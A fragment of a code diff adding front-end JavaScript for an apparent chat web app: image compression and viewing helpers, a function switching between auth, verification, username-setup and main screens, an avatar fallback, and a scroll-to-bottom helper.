+    c.getContext('2d').drawImage(img, 0, 0, c.width, c.height);
+    cb(c.toDataURL('image/jpeg', 0.65));
+  };
+  img.src = src;
+}
+function viewImg(src) {
+  document.getElementById('imgViewerImg').src = src;
+  document.getElementById('imgViewer').style.display = 'flex';
+}
+
+// ════════════════════════════════════════════════
+//  UI UTILS
+// ════════════════════════════════════════════════
+function showScreen(name) {
+  document.getElementById('authScreen').style.display     = name==='auth'     ? 'flex'  : 'none';
+  document.getElementById('verifyScreen').style.display   = name==='verify'   ? 'flex'  : 'none';
+  document.getElementById('usernameScreen').style.display = name==='username' ? 'flex'  : 'none';
+  document.getElementById('mainApp').style.display        = name==='main'     ? 'block' : 'none';
+
+  if (name === 'username') {
+    const wrap = document.getElementById('setupAvatarWrap');
+    const label = myProfile?.displayName || myProfile?.name || '??';
+    const key = currentUser?.uid || label;
+    const c = colorFor(key);
+    wrap.innerHTML = `<div class="un-pfp-fallback" style="background:${c}22;color:${c}">${initFor(label)}</div>`;
+  }
+}
+
+function scrollBottom() {
+  setTimeout(() => { const m = document.getElementById('msgs'); if(m) m.scrollTop = m.scrollHeight; }, 40);
+}
+</script>
+</body>
+</html>
